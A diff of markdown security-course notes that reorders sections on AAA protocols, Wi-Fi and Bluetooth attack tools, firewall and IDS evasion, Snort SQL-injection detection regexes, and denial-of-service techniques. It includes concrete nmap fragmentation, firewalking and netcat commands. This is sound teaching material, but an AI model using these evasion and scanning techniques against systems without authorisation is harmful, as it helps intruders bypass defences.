+  - A lot of administrative overhead
+  - Provides only basic security
+- **OS security**
+  - Linux ignores unsolicited replies, behavior can often be configured in other OSes
 # Wireless networks overview
 
 - Wireless network = Wi-Fi
@@ -7314,80 +7038,60 @@ networked computing devices via one or more centralized servers.
 - Switches uses back-end authentication server, see [AAA](./aaa-protocols.md)
 - Can authenticate based on MAC address or other requirements (certificate, VLAN etc.)
 - Per default all hosts on a wired connection (LAN) can see each other
-# Wireless security tools
+# AAA protocols
 
-## Wireless Intrusion Prevention Systems (WIPS)
+- AAA stands for (Authentication, Authorization, Accounting)
+- Family of protocols that mediate network access.
+- Sometimes these protocols are used in combination with
+  - [Point-to-Point Protocol (PPP)](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol)
+  - [Extensible Authentication Protocol (EAP)](#extensible-authentication-protocol-eap)
+  - Protected Extensible Authentication Protocol (PEAP)
+  - [Lightweight Directory Access Protocol (LDAP)](./../04-enumeration/enumeration-overview.md#ldap)
+- Most commonly used protocol is [RADIUS](#radius) and then [Diameter](#diameter), meanwhile older systems use [TACACS](#tacacs) and [TACACS+](#tacacs-tacacs-plus)
 
-- Also known as **Wireless IPS**
-- Network device
-- 📝 Intrusion detection by monitoring the radio spectrum for the presence of unauthorized access points (e.g. evil twins)
-- Intrusion prevention by taking steps to mitigate the threat (e.g. deattaching it).
-- E.g. • [Cisco Adaptive Wireless IPS](https://www.cisco.com/c/en/us/products/wireless/adaptive-wireless-ips-software/index.html) • [WatchGuard WIPS](https://www.watchguard.com/wgrd-products/access-points/wips)
+## RADIUS
 
-### Wireless Intrusion Detection Systems (WIDS)
+- Stands for **R**emote **A**uthentication **D**ial **I**n **U**ser **S**ervice
+- 📝 Commonly used by ISPs (Internet Service Providers) and corporations for access control
+- Primarily used to manage access to the internet or other networks
+  - Networks can employ a variety of networking technologies, including analog modems, DSL, wireless local area networks (WLANs), and VPNs.
+- Based on UDP (User Datagram Protocol)
+- Flexible and extensible offering a variety of ways to authenticate the user
+- Requires setting-up a RADIUS back-end server.
+  - Usually integrated with AD (active directory)
 
-- Also known as **Wireless IDS**
-- Monitors radio spectrum used by wireless LANs and alerts whenever a rogue access point is detected.
-- Alerts a systems administrator whenever a rogue access point is detected
+### Extensible Authentication Protocol (EAP)
 
-## Wi-Fi security auditing tools
+- Authentication framework used by [Enterprise WPA operation mode](./wireless-networks-overview.md#enterprise).
+- Strong when used with TLS (EAP-TLS)
+  - Higher security when client-side certificates are hosted in smart cards.
+- Extends and replaces [Point-to-Point Protocol (PPP)](./../15-cryptography/tunneling-protocols.md#ppp-point-to-point-protocol).
 
-- [AirMagnet® WiFi Analyzer PRO](https://www.netally.com/products/airmagnet-wifi-analyzer/)
-  - Real-time analysis of 802.11a/b/g/n/ac wireless networks
-- [RFProtect Wireless Intrusion Protection](https://www.arubanetworks.com/products/security/wireless-intrusion-protection/)
-  - Prevents denial-of-service and man-in-the-middle attacks and mitigates over-the-air security threats.
-- [FruityWiFi](http://www.fruitywifi.com)
-  - Open source tool to audit wireless networks
-  - Allows the user to deploy advanced attacks by directly using the web interface or by sending messages to it.
-- [Fern Wifi Cracker](https://github.com/savio-code/fern-wifi-cracker)
-  - Security auditing and attack software program
-  - Can run attacks such as cracking WEP/WPA/WPS keys
-- [OSWA-Assistant](http://securitystartshere.org/page-software-oswa-assistant.htm)
-  - Organizational System Wirelss Auditor
+#### EAP Transport Layer Security (EAP-TLS)
 
-## Wi-Fi predictive planning tools
+- Secure standard using TLS protocol
+- Requires mutual authentication
+  - Where the client-side certificate can be stored in e.g. smart cards.
 
-- Allows to plan and design Wi-Fi 6 networks
-- E.g.
-  - [AirMagnet® Planner](https://www.netally.com/products/airmagnet-planner/)
-    - Plan networks, estimate budgets, optimize, plan mitigation strategies
-  - [Cisco Prime Infrastructure](https://www.cisco.com/c/en/us/products/cloud-systems-management/prime-infrastructure/index.html)
-    - Solution for provisioning, monitoring, optimizing, and troubleshooting both wired and wireless devices
-  - [Ekahau Pro](https://www.ekahau.com/products/ekahau-connect/pro/)
-    - Tool for designing, analyzing, optimizing, and troubleshooting Wi-Fi networks.
-  - [TamoGraph Site Survey](https://www.tamos.com/products/wifi-site-survey/)
-    - Wireless site survey software tool for collecting, visualizing, and analyzing 802.11 a/b/g/n/ac/ax Wi-Fi data.
-  - [NetSpot](https://www.netspotapp.com/)
-    - Wi-Fi analysis, and troubleshooting on Mac OS X and Windows.
-    - Visualize, manage, troubleshoot, audit, plan, and deploy your wireless networks.
+## Diameter
 
-## Wi-Fi vulnerability scanning tools
+- Successor to RADIUS
+- Not directly backwards compatible
+- Security is provided by [IPsec](./../15-cryptography/tunneling-protocols.md#ipsec) or [TLS](./../15-cryptography/encrypting-communication.md#tls-transport-layer-security) and privacy protocols.
 
-- [Zenmap](https://Nmap.org/zenmap/)
-  - Official Nmap GUI.
-- [Nessus](https://www.tenable.com/products/nessus)
-  - Read more on [vulnerability analysis](./../05-vulnerabilities/vulnerability-analysis.md#nessus)
-- [Network Security Toolkit](https://www.networksecuritytoolkit.org)
-  - Bootable Fedora with network security tools
-- [SecPoint® Penetrator™ Vulnerability Scanner & Assessment](https://www.secpoint.com/penetrator.html)
-  - Comes with WiFi pen-testing tools
-- [SILICA](https://www.immunityinc.com/products/silica/)
-  - Automated, WiFi specific, vulnerability assessment and penetration tool.
-- [WebSploit](https://github.com/websploit/websploit)
-  - MITM framework with WiFi attacks
-- [Airbase-ng](https://aircrack-ng.org)
-  - Multi-purpose tool aimed at attacking clients as opposed to the Access Point (AP) itself
+## TACACS
 
-## Wi-Fi security tools for mobile
+- Terminal Access Controller Access-Control System
+- Remote authentication protocol
+- Commonly used in networks of UNIX systems
 
-- [Wifi Protector](https://wifi-protector.en.softonic.com/android?ex=CORE-139.6)
-  - Android WiFi firewall
-- [WiFiGuard](https://www.wifiguardapp.com/)
-  - iOS/Android app to scan and detect devices on WiFi network
-- [Wifi Inspector](https://play.google.com/store/apps/details?id=lksystems.wifiintruder&hl=en)
-  - Android app to scan and detect devices on WiFi network
-- [ARP Guard](https://play.google.com/store/apps/details?id=com.myprog.arpguard&hl=en&gl=US)
-  - Android app for protection against network attacks including ARP posioning.
+## TACACS+ (TACACS plus)
+
+- Terminal Access Controller Access-Control System Plus
+- Provides access control for routers, network access servers, and other
+networked computing devices via one or more centralized servers.
+- Based on TACACS but an entirely new protocol (incompatible with TACACS)
+- Runs on older systems but generally replaced by [RADIUS](#radius)
 # Wireless threats and attacks
 
 ## Wireless threats
@@ -7569,6 +7273,184 @@ networked computing devices via one or more centralized servers.
 - 📝 Windows tool to sniff packets and crack passwords
 - Relies on statistical measures and the PTW technique to break WEP
 - See also • [Cain and Abel | Web server threats and attacks](./../12-web-servers/web-server-threats-and-attacks.md#cain-and-abel) • [Cain and Abel | Sniffing tools](./../08-sniffing/sniffing-tools.md#cain-and-abel)
+# Wireless security tools
+
+## Wireless Intrusion Prevention Systems (WIPS)
+
+- Also known as **Wireless IPS**
+- Network device
+- 📝 Intrusion detection by monitoring the radio spectrum for the presence of unauthorized access points (e.g. evil twins)
+- Intrusion prevention by taking steps to mitigate the threat (e.g. deattaching it).
+- E.g. • [Cisco Adaptive Wireless IPS](https://www.cisco.com/c/en/us/products/wireless/adaptive-wireless-ips-software/index.html) • [WatchGuard WIPS](https://www.watchguard.com/wgrd-products/access-points/wips)
+
+### Wireless Intrusion Detection Systems (WIDS)
+
+- Also known as **Wireless IDS**
+- Monitors radio spectrum used by wireless LANs and alerts whenever a rogue access point is detected.
+- Alerts a systems administrator whenever a rogue access point is detected
+
+## Wi-Fi security auditing tools
+
+- [AirMagnet® WiFi Analyzer PRO](https://www.netally.com/products/airmagnet-wifi-analyzer/)
+  - Real-time analysis of 802.11a/b/g/n/ac wireless networks
+- [RFProtect Wireless Intrusion Protection](https://www.arubanetworks.com/products/security/wireless-intrusion-protection/)
+  - Prevents denial-of-service and man-in-the-middle attacks and mitigates over-the-air security threats.
+- [FruityWiFi](http://www.fruitywifi.com)
+  - Open source tool to audit wireless networks
+  - Allows the user to deploy advanced attacks by directly using the web interface or by sending messages to it.
+- [Fern Wifi Cracker](https://github.com/savio-code/fern-wifi-cracker)
+  - Security auditing and attack software program
+  - Can run attacks such as cracking WEP/WPA/WPS keys
+- [OSWA-Assistant](http://securitystartshere.org/page-software-oswa-assistant.htm)
+  - Organizational System Wirelss Auditor
+
+## Wi-Fi predictive planning tools
+
+- Allows to plan and design Wi-Fi 6 networks
+- E.g.
+  - [AirMagnet® Planner](https://www.netally.com/products/airmagnet-planner/)
+    - Plan networks, estimate budgets, optimize, plan mitigation strategies
+  - [Cisco Prime Infrastructure](https://www.cisco.com/c/en/us/products/cloud-systems-management/prime-infrastructure/index.html)
+    - Solution for provisioning, monitoring, optimizing, and troubleshooting both wired and wireless devices
+  - [Ekahau Pro](https://www.ekahau.com/products/ekahau-connect/pro/)
+    - Tool for designing, analyzing, optimizing, and troubleshooting Wi-Fi networks.
+  - [TamoGraph Site Survey](https://www.tamos.com/products/wifi-site-survey/)
+    - Wireless site survey software tool for collecting, visualizing, and analyzing 802.11 a/b/g/n/ac/ax Wi-Fi data.
+  - [NetSpot](https://www.netspotapp.com/)
+    - Wi-Fi analysis, and troubleshooting on Mac OS X and Windows.
+    - Visualize, manage, troubleshoot, audit, plan, and deploy your wireless networks.
+
+## Wi-Fi vulnerability scanning tools
+
+- [Zenmap](https://Nmap.org/zenmap/)
+  - Official Nmap GUI.
+- [Nessus](https://www.tenable.com/products/nessus)
+  - Read more on [vulnerability analysis](./../05-vulnerabilities/vulnerability-analysis.md#nessus)
+- [Network Security Toolkit](https://www.networksecuritytoolkit.org)
+  - Bootable Fedora with network security tools
+- [SecPoint® Penetrator™ Vulnerability Scanner & Assessment](https://www.secpoint.com/penetrator.html)
+  - Comes with WiFi pen-testing tools
+- [SILICA](https://www.immunityinc.com/products/silica/)
+  - Automated, WiFi specific, vulnerability assessment and penetration tool.
+- [WebSploit](https://github.com/websploit/websploit)
+  - MITM framework with WiFi attacks
+- [Airbase-ng](https://aircrack-ng.org)
+  - Multi-purpose tool aimed at attacking clients as opposed to the Access Point (AP) itself
+
+## Wi-Fi security tools for mobile
+
+- [Wifi Protector](https://wifi-protector.en.softonic.com/android?ex=CORE-139.6)
+  - Android WiFi firewall
+- [WiFiGuard](https://www.wifiguardapp.com/)
+  - iOS/Android app to scan and detect devices on WiFi network
+- [Wifi Inspector](https://play.google.com/store/apps/details?id=lksystems.wifiintruder&hl=en)
+  - Android app to scan and detect devices on WiFi network
+- [ARP Guard](https://play.google.com/store/apps/details?id=com.myprog.arpguard&hl=en&gl=US)
+  - Android app for protection against network attacks including ARP posioning.
+# Bluetooth
+
+- Range is typically less than 10m
+- Operates on the 2.4 GHz
+- Discovery feature can control the visibility of the device
+- **Bluetooth Low Energy (BLE)**: Bluetooth >= 4.0
+- **Bluetooth Classic (BC)**: Bluetooth < 4.0
+- Uses WPAN (wireless personal area network)
+- Utilize the Gaussian Frequency Shift Keying (FSK) to exchange information in the basic rate (BR) of usually 1 mbps.
+
+## Bluetooth security
+
+- Standard provides three basic security services:
+  - **Authentication**
+    - To verify the identity of communicating devices
+  - **Confidentiality**
+    - To prevent the compromise of information and ensure that only
+    authorized devices can access and view data.
+  - **Authorization**
+    - To allow the control of resources by ensuring that a device is
+    authorized to use a service before permitting it to do so.
+- ❗ Standard does not address address other security services such as audit and non-repudiation.
+- Four security modes (levels):
+  1. **Mode 1**: No authentication/encryption.
+  2. **Mode 2**: Authorization with access control policies.
+  3. **Mode 3**: Mandate authentication and encryption using secret key with paired devices
+  4. **Mode 4**: Secure Simple Pairing using [Elliptic-Curve Diffie-Hellman (ECDH)](./../15-cryptography/encryption-algorithms.md#elliptic-curve-diffiehellman) for key exchange and link key generation
+
+## Bluetooth device discovery
+
+- [BlueScanner](https://sourceforge.net/projects/bluescanner/): Finds devices around and displays information
+- [BT Browser](http://www.bluejackingtools.com/java/bt-browser-20/): Find and enumerate nearby devices
+
+## Bluetooth attacks
+
+### BlueSmacking
+
+- 📝 DoS attack using echo.
+
+### BlueJacking
+
+- 📝 Sending unsolicited data to bluetooth devices
+- Allows spamming for bluetooth also known as **BlueSpamming**
+- ❗ Not related to hijacking
+
+### BluePrinting
+
+- 📝 Extracting information about the device
+
+### BlueSnarfing
+
+- 📝 Stealing data from target device
+- E.g. calendars, contact lists, emails and text messages
+
+### BlackJacking
+
+- 📝 Exploits a blackberry device to attack corporate LAN directly
+- Compromises blackberry then proxies between corporate servers and attacker.
+
+#### BBProxy
+
+- 📝 Bluejacking tool
+- Included in [BlackBerry Attack Toolkit](https://sourceforge.net/projects/bbat/)
+- Announced by [DefCon](https://www.defcon.org/images/defcon-14/dc-14-presentations/DC-14-X30n.pdf)
+
+### BlueBugging
+
+- Also known as **bluebug-attack**
+- Create a [backdoor attack](./../07-malware/malware-overview.md#backdoor) before returning control of the phone to its owner
+- Extends [BlueJacking](#bluejacking) and [BlueSnarfing](#bluesnarfing) (allows attacker to access data)
+- E.g. by pretending to be a headset to receive phone calls
+- Not so common as vulnerabilities are generally patched
+
+#### Bloover
+
+- A proof-of-concept [tool](https://trifinite.org/trifinite_stuff_blooover.html)
+- 📝 Exploits bluebugging targeting J2ME (Java micro edition) enabled phones such as Nokia
+- [Bloover II](https://trifinite.org/trifinite_stuff_bloooverii.html): Exploits bluebug and also helomoto, bluesnarf and OBEX object push attacks
+
+## Bluetooth attacks countermeasures
+
+- Check paired devices
+- Turn off visibility / turn off Bluetooth if not used
+- Use strong PIN
+- Use encryption
+- Use the strongest security mode available
+- Don't accept unknown requests
+- Use [bluetooth security tools](#bluetooth-security-tools)
+
+## Bluetooth security tools
+
+- [Bluetooth firewall](http://www.fruitmobile.com/bt_firewall.html)
+  - Mobile app for logging and monitoring Bluetooth connections
+  - Radar feature allows you to scan nearby bluetooth devices
+  - Scan feature lists apps that can perform bluetooth actions
+- [Bluediving](https://github.com/balle/bluediving)
+  - Bluetooth penetration suite
+  - Exploits BlueBug, BlueSnarf, BlueSnarf++ and BlueSmack
+- [Bluelog](https://github.com/MS3FGX/Bluelog)
+  - Linux Bluetooth scanner
+- [btscanner](https://packages.debian.org/unstable/btscanner)
+  - Debian tool to extract information from a Bluetooth device without the requirement to pair.
+- [BlueRanger](https://tools.kali.org/wireless-attacks/blueranger)
+  - Simple Bash script which uses Link Quality to locate Bluetooth device radios
 # Social engineering overview
 
 - 📝 Art of convincing people to reveal confidential information
@@ -7897,64 +7779,6 @@ networked computing devices via one or more centralized servers.
 - **Anti-virus and anti-phishing defenses**
 - **Background check and proper termination process**
   - Insiders with a criminal background and terminated employees are easy targets for procuring information.
-# Evading firewalls
-
-- See also • [Bypassing IDS and firewall | Scanning Networks](../03-scanning-networks/bypassing-ids-and-firewall.md) • [Evading IDS](evading-ids.md)
-
-## Firewall evasion techniques
-
-- [Source routing](../03-scanning-networks/bypassing-ids-and-firewall.md#source-routing) to avoid the route of the firewall
-
-### Using fragmented packets
-
-- The idea is to split up the TCP header over several packets to make it harder
-- E.g. `-f` command in `nmap`: `nmap -f 192.168.1.12`
-  - utilizes 16 bytes per fragment which diminishes the number of fragments
-  - to specify own offset size: `nmap --mtu 16 192.168.1.12`
-- ❗ Most modern firewall and IDS detect fragmented packets.
-
-### Firewalking
-
-- 📝 Discovers firewall rules using traceroute-like technique with IP TTL expiration
-- Works by sending out TCP or UDP packets with a TTL one greater than the targeted gateway
-  - Tests if gateway allows the traffic to find firewalls
-- Requires knowledge of:
-  1. Known gateway (can be firewall) before the host (serves as waypoint)
-  2. IP address of a host located behind the firewall.
-- ❗ If a host on the other side of the firewall cannot be targeted then firewalking will not be successful
-- Also known as ***port knocking***
-  - Externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports
-- **Tools**
-  - [`firewall` script](https://Nmap.org/nsedoc/scripts/firewalk.html) in `nmap`: e.g. `nmap --traceroute --script=firewalk --script-args=firewalk.max-probed-ports=-1 192.168.3.11`
-  - [Firewall tool](http://packetfactory.openwall.net/projects/firewalk/index.html) e.g. `firewalk 192.168.1.2 192.168.3.11`
-    - Responses can be interpreted as:
-      - **`ICMP_TIME_EXCEEDED`**: Gateway forwards packets to next hop where they're expired.
-      - **No response**: Port is probably blocked
-- **Countermeasures**
-  - Use Network Address Translation to hide the addresses on your internal networks
-  - Block all outgoing TTL Exceeded in Transit packets in the firewall
-
-### HTTP and ICMP tunneling
-
-- Can be used to bypass firewalls rules through obfuscation of the actual traffic
-- Works by injecting arbitrary data into packets sent to a remote computer
-- Hard to detect without proper deep packet inspection or log review
-- HTTP tunneling (port 80) is almost never filtered by a firewall.
-
-### DNS tunneling
-
-- Also known as **TCP over DNS**
-- Provides a TCP tunnel through the standard DNS protocol
-- Used to evade firewalls as most firewalls allow DNS traffic to freely pass into and out of the network.
-- 🤗💡 May browsing internet in coffee shops for free
-- Tools include • [iodine](https://github.com/yarrick/iodine) • [ThunderDNS](https://github.com/fbkcs/ThunderDNS)
-
-## Banner grabbing
-
-- Used to identify firewalls.
-- Tools
-  - Using [Nmap banner script](https://Nmap.org/nsedoc/scripts/banner.html) `nmap -sV --script=banner <target-ip>`
-  - Using [`netcat`](./../03-scanning-networks/banner-grabbing.md#netcat): `nc -v -n 192.168.51.129 21`
 # Evading IDS
 
 - See also [SQL evasion](./../14-sql-injection/sql-injection-overview.md#sql-evasion)
@@ -8343,6 +8167,64 @@ networked computing devices via one or more centralized servers.
 - A network which enables a secure connection to a private network through the Internet.
 - Information is protected by encryption and integrity checks.
 - Can use e.g. [IPSec](./../15-cryptography/tunneling-protocols.md#ipsec) or [OpenVPN](./../15-cryptography/tunneling-protocols.md#openvpn) tunnelling protocol.
+# Evading firewalls
+
+- See also • [Bypassing IDS and firewall | Scanning Networks](../03-scanning-networks/bypassing-ids-and-firewall.md) • [Evading IDS](evading-ids.md)
+
+## Firewall evasion techniques
+
+- [Source routing](../03-scanning-networks/bypassing-ids-and-firewall.md#source-routing) to avoid the route of the firewall
+
+### Using fragmented packets
+
+- The idea is to split up the TCP header over several packets to make it harder
+- E.g. `-f` command in `nmap`: `nmap -f 192.168.1.12`
+  - utilizes 16 bytes per fragment which diminishes the number of fragments
+  - to specify own offset size: `nmap --mtu 16 192.168.1.12`
+- ❗ Most modern firewall and IDS detect fragmented packets.
+
+### Firewalking
+
+- 📝 Discovers firewall rules using traceroute-like technique with IP TTL expiration
+- Works by sending out TCP or UDP packets with a TTL one greater than the targeted gateway
+  - Tests if gateway allows the traffic to find firewalls
+- Requires knowledge of:
+  1. Known gateway (can be firewall) before the host (serves as waypoint)
+  2. IP address of a host located behind the firewall.
+- ❗ If a host on the other side of the firewall cannot be targeted then firewalking will not be successful
+- Also known as ***port knocking***
+  - Externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports
+- **Tools**
+  - [`firewall` script](https://Nmap.org/nsedoc/scripts/firewalk.html) in `nmap`: e.g. `nmap --traceroute --script=firewalk --script-args=firewalk.max-probed-ports=-1 192.168.3.11`
+  - [Firewall tool](http://packetfactory.openwall.net/projects/firewalk/index.html) e.g. `firewalk 192.168.1.2 192.168.3.11`
+    - Responses can be interpreted as:
+      - **`ICMP_TIME_EXCEEDED`**: Gateway forwards packets to next hop where they're expired.
+      - **No response**: Port is probably blocked
+- **Countermeasures**
+  - Use Network Address Translation to hide the addresses on your internal networks
+  - Block all outgoing TTL Exceeded in Transit packets in the firewall
+
+### HTTP and ICMP tunneling
+
+- Can be used to bypass firewalls rules through obfuscation of the actual traffic
+- Works by injecting arbitrary data into packets sent to a remote computer
+- Hard to detect without proper deep packet inspection or log review
+- HTTP tunneling (port 80) is almost never filtered by a firewall.
+
+### DNS tunneling
+
+- Also known as **TCP over DNS**
+- Provides a TCP tunnel through the standard DNS protocol
+- Used to evade firewalls as most firewalls allow DNS traffic to freely pass into and out of the network.
+- 🤗💡 May browsing internet in coffee shops for free
+- Tools include • [iodine](https://github.com/yarrick/iodine) • [ThunderDNS](https://github.com/fbkcs/ThunderDNS)
+
+## Banner grabbing
+
+- Used to identify firewalls.
+- Tools
+  - Using [Nmap banner script](https://Nmap.org/nsedoc/scripts/banner.html) `nmap -sV --script=banner <target-ip>`
+  - Using [`netcat`](./../03-scanning-networks/banner-grabbing.md#netcat): `nc -v -n 192.168.51.129 21`
 # Honeypots
 
 - Designed as a trap for attackers who try to access the network.
@@ -8410,175 +8292,6 @@ networked computing devices via one or more centralized servers.
     - `not port 22`: filter out own connection to the server
   - Run `wireshark-gtk -k -i myPipe.fifo` to start wireshark
 - You can now use proxy using e.g. Firefox and see the traffic.
-# Intrusion detection system (IDS) overview
-
-- Detects intrusions in real time and alerts
-- Can filter the traffic and alert the security personnel
-  - Also known as ***intrusion detection and prevention systems (IDPS)*** or ***intrusion prevention systems (IPS)***
-- Inspects both incoming (inbound) and outgoing (outbound) traffic
-- Can be a software or hardware
-- Usually placed near the firewall
-  - Inside or outside depending on which traffic is being monitoring
-  - 💡 Good to deploy on both places (before and after DMZ) for layered defense
-
-## Intrusion types
-
-- **Filesystem intrusion**
-  - Unexpected creation/deletion/modification of files or file attributes (e.g. permissions)
-- **Network intrusion**
-  - Increase in bandwidth consumption
-  - Unexpected incoming connections e.g. attempted logins
-  - Sudden increase of logs can be caused by DoS/DDoS
-- **System intrusion**
-  - Missing/modified for log, system or configuration files
-  - Degradation in system performance
-  - Unfamiliar processes, system reboots, crashes
-
-## IDS types
-
-### Network-based vs Host-based IDS
-
-- Comparison
-
-  | | [NIDS](#network-based-intrusion-detection-systems-nidss) | [HIDS](#host-based-intrusion-detection-systems-hidss) |
-  |-|----|----|
-  | Strength | Sensing attacks from outside | Sensing attacks from inside that NIDS cannot examine |
-  | Packet headers | Examines | Does not understand |
-  | Host | Independent | Dependent |
-  | Bandwidth | In need of | Does not require |
-  | Performance | Slows down networks where it's installed | Slow down hosts where it's installed |
-  | Attack types | Senses network attacks as payload is analyzed | Senses local attacks before they hit the network |
-  | False positive rate | High | Low |
-  
-- See also [WIDS (Wireless Intrusion Detection system)](./../09-wireless-networks/wireless-security-tools.md#wireless-intrusion-detection-systems-wids)
-
-#### Network-based intrusion detection systems (NIDSs)
-
-- Also known as ***network-based IDS***
-- Inspects each incoming packet for anomalies and suspicious patterns.
-- Can detect DoS attacks, port scans, or break-in attempts.
-
-##### Network tap
-
-- Typically a hardware device, which provides a way to access the data flowing across a computer network.
-- Provide IDS visibility into the traffic flowing over the network
-- E.g. a hub connected on the segment or a network appliance created specifically for the task
-
-##### Snort
-
-- [Open-source](https://www.snort.org) NIDS that's most widely deployed
-- Rule-based IPS to detect and stop packages
-- Can block expressions such as
-  - ` /(\%27)|(\')|(\-\-)|(\%23)|(#)/ix`
-  - `/((\%27)|(\'))union/ix`
-
-###### Snort configurations
-
-- Alerts are defined in Snort configuration file
-  - Configuration file is at `/etc/snort`, or `C:\Snort\etc`
-- Can be configured to use as:
-  - packet sniffer
-    - E.g. `snort -vde`
-  - packet logger
-    - E.g. `./snort -dev -l ./log`
-  - Network intrusion detection system by
-    - Does not drop packets
-    - Evaluates packets to check all alert rules, logging the matches.
-    - E.g. `./snort -dev -l ./log -h 192.168.1.0/24 -c snort.conf`
-  - Network intrusion protection System
-
-###### Snort rules
-
-- All rules are checked for each packet
-- If multiple matches are found:
-  - Alerts the most unique (specific) rule ignoring the more generic one.
-- 📝 **Syntax**
-  - Action protocol address port -> address port (option:value;option:value)
-  - E.g. `alert tcp 10.0.0.1 25 -> 10.0.0.2 25 (msg:"Sample Alert"; sid:1000;)`
-
-#### Host-Based intrusion detection systems (HIDSs)
-
-- Also known as ***host-based IDS***
-- 📝 Analyzes behavior and events on a particular host e.g. a desktop PC or a server.
-- Can detect both anomalies and unauthorized changes in the filesystem.
-- Log file monitoring (LFM): Monitoring logs files for malicious events.
-- **File integrity checking**
-  - Checking for modified files e.g. [ossec-hids](https://github.com/ossec/ossec-hids)
-  - Compares the current hash value of the file against its known-good hash value.
-- E.g. [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security), [Norton Internet Security](https://us.norton.com/internet-security)..
-
-### Active vs passive IDS
-
-#### Active IDS
-
-- Also known as **Intrusion Detection and Prevention System (IDPS)** or **Intrusion Protection Systems (IPS)**
-- Configured to automatically block suspected attacks without any intervention required by an operator
-
-#### Passive IDS
-
-- Configured to only monitor and analyze network traffic activity and alert
-- Does not perform any protective or corrective functions on its own
-
-### Signature-based vs Anomaly-based IDS
-
-- 💡 Recent systems uses both (hybrid approach) to cover each others flaws
-
-#### Signature recognition
-
-- Also known as ***misuse detection***, ***signature based IDS*** or ***signature-based IDS***
-- 📝 Compares incoming and outgoing traffic to the signatures of already known attacks
-- Based on a database of previous attack signatures and known system vulnerabilities.
-- A signature is a recorded evidence of an intrusion or attack
-- 📝 **Pros**
-  - Little false positives
-  - No need for a training phase, starts working out of the box
-- 📝 **Cons**
-  - Vulnerable to unique attacks, easy to fool
-  - High dependency of latest updates, constant maintenance
-  - Signature data consumes traffic
-
-#### Anomaly detection
-
-- Also known as ***not-use detection***, ***behavior based IDS*** or ***behavior-based IDS***.
-- 📝 Analyzes characteristics of the system's users and components and looks for deviations.
-- Learns pattern of normal system activity to identify active intrusion attempts.
-- Deviations from this baseline or pattern cause an alarm to be triggered.
-- Can use artificial intelligence or can be based on heuristics or rules
-- 📝 **Pros**
-  - More suitable for blocking future unknown attacks
-  - Low dependency of latest updates, constant maintenance
-- 📝 **Cons**
-  - Higher false positive alarm rates
-  - Challenging to construct a model thoroughly on a regular network.
-
-##### Protocol anomaly detection
-
-- Identifies anomalies specific to a protocol
-- Uses a model of the different ways vendors deploy the TCP/IP protocol.
-
-## IDS alerts
-
-- 📝 **IDS alert types**
-  - **True positive**: Attack + Alert
-  - **False positive**: No attack + Alert
-  - **True negative**: No attack + No alert
-  - **False negative**: Attack + No alert
-  - 💡 False negatives are considered far worse than false positives
-- 📝 **IDS alert thresholding**
-  - Also known as ***alert throttling*** or ***event filtering***.
-  - Reducing the volume of repeated alerts
-  - E.g. ignore alerts after nth times during X minutes
-
-## Firewall vs IPS vs IDS
-
-| | [Firewall](./firewall-overview.md) | IPS | IDS |
-| --------- | ------- | ------ |
-| **Abbreviation for** | - | Intrusion Prevention System | Intrusion Detection System |
-| **Firewall** | Filters incoming and outgoing network traffic based on predetermined rules | Inspects traffic, detects it, classifies and then proactively stops malicious traffic from attack. | Monitors a traffic for malicious activity or policy violations and sends alert on detection. |
-| **Working principle** | Filters traffic based on IP address and port numbers (layer 3), state of the connection (layer 4), or contents of packet (layer 7) | Inspects real time traffic and looks for traffic patterns or signatures of attack and then prevents the attacks on detection | Detects real time traffic and looks for traffic patterns or signatures of attack and them generates alerts |
-| **Configuration mode** | Layer 2 to 7 | Layer 3 and 4 |  Layer 2 to 7 |
-| **Usual placement** | First line of defense | After firewall | After firewall |
-| **Action on unauthorized traffic detection** | Block the traffic | Block the traffic |  Alerts/alarms |
 # Hacking web servers
 
 ## Web server
@@ -8919,251 +8632,6 @@ networked computing devices via one or more centralized servers.
 - Sends a large # of NOP instructions into buffer.
 - Solves the problem of finding the right place for code execution, as NOPs does nothing and target area is big the execution will slide to no-ops where malicious code will be executed.
 - Most IDS protect from this attack.
-# Denial of service
-
-- Attacker overloads the target system with a lot of traffic
-- Goal is to reduce, restrict or prevent accessibility of system resources to its legitimate users
-
-## Botnets
-
-- Bots are software applications that run-automated tasks over the internet
-- A botnet is a huge network of compromised systems and can be used by an attacker to launch a DoS attack
-- Controlled by **Command and Control server** owned by the attacker
-- **Distributed Denial of Service (DDoS)**
-  - Using botnets (compromised systems) to perform a DoS attack.
-- DoS and DDoS attack tools: • [LOIC](#low-orbit-ion-cannon-loic) • [GoldenEye or Petya](https://en.wikipedia.org/wiki/Petya_(malware))
-- See also [Botnet](./../01-introduction/security-threats-and-attacks.md#botnet) and [Botnet trojans](./../07-malware/trojans.md#botnet-trojans)
-
-## Attack vectors
-
-### Volumetric attacks
-
-- Goal is to use up bandwidth of the target network or service.
-
-#### Volumetric attacks types
-
-- **Flood attacks**
-  - Sending high volume traffic, can utilize zombies
-- **Amplification attacks**
-  - Sending magnified traffic, can utilize zombies
-
-#### Volumetric attack techniques
-
-- **UDP flood attack**
-  - Flooding random ports of the target server with a huge number of spoofed UDP packets
-  - Causes the server to continuously check for applications on the ports.
-    - When not found, system responds with `ICMP Destination Unreachable` packet increasing its traffic.
-- **ICMP flood attack** or **Ping flood**
-  - Flooding with ICMP echo request packets.
-
-##### Smurf attack
-
-- 📝 Flooding a IP broadcast network with ICMP echo request packets with victim IP address as source
-- Causes hosts in the network respond to received requests/responds targeting the victim.
-- Leads to server overloads in victim caused by too many replies.
-- The reason to attack broadcast address is to send so many ICMP requests going to the target that all its resources are taken up.
-- Mitigated by either
-  - configuring routers/hosts to not respond to ICMP broadcasts/requests
-  - configuring routers to not forward packets directed to broadcast addresses
-- See also [Broadcast ICMP ping](./../03-scanning-networks/scanning-techniques.md#broadcast-icmp-ping)
-
-##### Ping of death attack
-
-- 📝 Sending irregular or big packets using `ping` command
-- Attacker fragments ICMP message to send to target.
-- When the fragments are reassembled, the resultant ICMP packet is larger than max size and crashes the system
-
-### Protocol attacks
-
-- Also known as **state exhaustion flood attacks**
-- Goal is to make target device reject new connections
-- Targets connection state tables, that are present in e.g. load balancers, firewalls, app servers
-
-#### Protocol attack techniques
-
-##### SYN flood attack
-
-- Also known as **SYN Attack** or **SYN ACK flood attack**
-- Exploits a flaw in [TCP three-way handshake](./../03-scanning-networks/tcpip-basics.md#three-way-handshake)
-- Floods SYN requests with fake source IPs
-  - Target responds with a SYN ACK packet and waits for the sender to complete the session
-  - Sender never completes the session as source IP is fake.
